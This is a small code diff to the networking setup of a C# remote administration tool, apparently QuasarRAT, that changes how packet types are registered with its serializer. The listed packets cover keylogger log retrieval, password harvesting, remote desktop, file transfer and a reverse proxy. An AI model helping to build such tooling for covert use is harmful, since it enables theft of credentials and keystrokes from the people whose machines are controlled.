@@ -120,7 +120,7 @@ namespace xServer.Core.Networking
 
             _server = new Server();
 
-            _server.AddTypesToSerializer(typeof(IPacket), new Type[]
+            _server.AddTypesToSerializer(new Type[]
             {
                 typeof (Packets.ServerPackets.GetAuthentication),
                 typeof (Packets.ServerPackets.DoClientDisconnect),
@@ -152,8 +152,10 @@ namespace xServer.Core.Networking
                 typeof (Packets.ServerPackets.DoDownloadFileCancel),
                 typeof (Packets.ServerPackets.GetKeyloggerLogs),
                 typeof (Packets.ServerPackets.DoUploadFile),
+                typeof (Packets.ServerPackets.GetPasswords),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
+                typeof (Packets.ClientPackets.SetStatusFileManager),
                 typeof (Packets.ClientPackets.SetUserStatus),
                 typeof (Packets.ClientPackets.GetDesktopResponse),
                 typeof (Packets.ClientPackets.GetProcessesResponse),
@@ -166,7 +168,6 @@ namespace xServer.Core.Networking
                 typeof (Packets.ClientPackets.GetStartupItemsResponse),
                 typeof (Packets.ClientPackets.GetKeyloggerLogsResponse),
                 typeof (Packets.ClientPackets.GetPasswordsResponse),
-                typeof (Packets.ServerPackets.GetPasswords),
                 typeof (ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyData),
